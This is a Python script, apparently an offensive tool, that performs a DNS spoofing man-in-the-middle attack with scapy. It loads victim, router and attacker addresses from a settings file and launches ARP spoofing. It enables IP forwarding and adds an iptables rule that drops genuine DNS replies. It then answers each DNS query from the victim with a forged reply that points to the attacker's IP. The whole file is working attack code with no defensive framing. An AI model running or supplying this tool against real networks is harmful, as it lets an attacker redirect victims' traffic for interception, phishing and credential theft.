import os, sys, time
import multiprocessing
import arpSpoof
import argparse, signal
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
import subprocess

def configuration():
    global attackIP, routerIP, victimIP, attackMac, routerMac, victimMac
    with open('setting.txt','r') as config:
        attackMac = config.readline().replace('\n','')
        routerMac = config.readline().replace('\n','')
        victimMac = config.readline().replace('\n','')
        attackIP = config.readline().replace('\n','')
        routerIP = config.readline().replace('\n','')
        victimIP = config.readline().replace('\n','')
        config.close()

def readPacket(packet):
    global attackIP, routerIP, victimIP, attackMac, routerMac, victimMac
    if packet.haslayer(DNSQR) and packet[IP].src == victimIP:
        packetResponse = (Ether()/IP(dst=packet[IP].src, src=packet[IP].dst)/\
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                      DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                      an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=attackIP)))
        print(packet[IP].src+" "+packet[IP].dst)
        sendp(packetResponse,count=1,verbose=0)
        print("Redirecting")

def spoof():
    global attackIP, routerIP, victimIP, attackMac, routerMac, victimMac
    arpProcess = multiprocessing.Process(target=arpSpoof.arp_spoof, args=(routerIP,routerMac,victimIP,victimMac,attackMac))
    arpProcess.start()
    sniffFilter="udp and port 53"
    sniff(filter=sniffFilter,prn=readPacket,count=0)


if __name__=='__main__':
    try:
        configuration()
        print("DNS spoof start")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        firewall = "iptables -A FORWARD -p UDP --sport 53 -d 10.0.0.8 -j DROP"
        subprocess.Popen([firewall],shell=True,stdout=subprocess.PIPE)
        spoof()
    except KeyboardInterrupt:
        print("Exit")
